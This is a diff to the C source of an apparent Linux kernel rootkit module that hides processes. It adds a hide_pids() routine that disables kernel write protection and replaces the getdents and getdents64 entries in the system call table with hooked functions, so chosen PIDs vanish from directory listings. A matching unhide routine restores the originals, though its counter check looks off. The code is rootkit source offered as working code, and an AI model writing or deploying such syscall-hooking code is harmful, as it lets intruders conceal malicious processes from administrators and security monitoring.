@@ -1,6 +1,7 @@
 #include <linux/slab.h>
 #include <linux/pid.h>
 
+#include "hook.h"
 #include "hidepid.h"
 
 pid_list_t hidden_pids = {
@@ -10,6 +11,39 @@ pid_list_t hidden_pids = {
 };
 
 pid_list_t_ptr hidden_pids_tail = &hidden_pids;
+
+void
+hide_pids(void)
+{
+    if (atomic_inc_return(&getdents_install_count) == 1) {
+        disable_protection();
+        sys_calls[__NR_getdents] = (void *)g7_getdents;
+        sys_calls[__NR_getdents64] = (void *)g7_getdents64;
+        enable_protection();
+    }
+}
+
+void
+unhide_pids(void)
+{
+    if (atomic_dec_return(&getdents_install_count) < 0) {
+        atomic_set(&getdents_install_count, 0);
+
+        if (sys_getdents) {
+            disable_protection();
+            sys_calls[__NR_getdents] = (void *)sys_getdents;
+            enable_protection();
+            while (atomic_read(&getdents_count) > 0);
+        }
+
+        if (sys_getdents64) {
+            disable_protection();
+            sys_calls[__NR_getdents64] = (void *)sys_getdents64;
+            enable_protection();
+            while (atomic_read(&getdents64_count) > 0);
+        }
+    }
+}
 
 
 void
@@ -39,13 +73,6 @@ clear_hidden_pids(void)
 {
     pid_list_t_ptr i = hidden_pids_tail;
     while ((i = remove_pid_from_list(i, i->pid)));
-}
-
-void
-unhide_pids(void)
-{
-    clear_hidden_pids();
-    // TODO: disable pid hiding
 }
 
 
